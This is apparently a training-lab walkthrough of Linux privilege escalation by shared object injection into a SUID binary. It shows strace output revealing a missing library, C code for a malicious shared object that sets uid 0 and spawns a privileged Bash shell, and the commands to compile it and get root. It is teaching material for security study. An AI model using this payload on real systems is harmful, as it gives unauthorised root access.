The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:
```
/usr/local/bin/suid-so
```
Run strace on the file and search the output for open/access calls and for "no such file" errors:
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
```
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

```

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:
```
mkdir /home/user/.config
```
Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell.
```
user@debian:~$ cat /home/user/tools/suid/libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}

```
Compile the code into a shared object at the location the suid-so executable was looking for it:
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
```
/usr/local/bin/suid-so
```

